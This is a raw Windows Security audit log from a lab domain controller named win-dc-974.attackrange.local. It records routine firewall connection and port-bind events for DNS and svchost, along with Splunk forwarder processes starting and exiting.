SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382283
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		::1
	Source Port:		52821
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:54:05 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382282
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		52821
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:54:05 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382281
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		52821
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:54:05 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382280
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		52821
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:54:05 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382279
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		59686
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:05 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382278
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		::1
	Source Port:		57968
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:54:05 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382277
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		57968
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:54:05 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382276
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		57968
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:54:05 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382275
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		57968
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:54:06 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382293
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1bd8
	New Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-admon.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x1954
	Creator Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe
	Process Command Line:	"C:\Program Files\SplunkUniversalForwarder\bin\splunk-admon.exe"

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:54:06 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382292
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Process Information:
	Process ID:	0x1de4
	Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-MonitorNoHandle.exe
	Exit Status:	0x1
03/01/2021 10:54:06 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382291
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1de4
	New Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-MonitorNoHandle.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x1954
	Creator Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe
	Process Command Line:	"C:\Program Files\SplunkUniversalForwarder\bin\splunk-MonitorNoHandle.exe"

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:54:06 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382290
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		127.0.0.1
	Source Port:		52821
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65787
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	44
03/01/2021 10:54:06 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382289
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		127.0.0.1
	Source Port:		52821
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:06 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382288
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		127.0.0.1
	Source Port:		57968
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65787
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	44
03/01/2021 10:54:06 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382287
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		127.0.0.1
	Source Port:		57968
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:07 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382296
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Process Information:
	Process ID:	0x1bd8
	Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-admon.exe
	Exit Status:	0x1
03/01/2021 10:54:07 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382295
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55137
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:07 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382294
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55137
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:54:09 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382300
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Process Information:
	Process ID:	0x1fac
	Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe
	Exit Status:	0x1
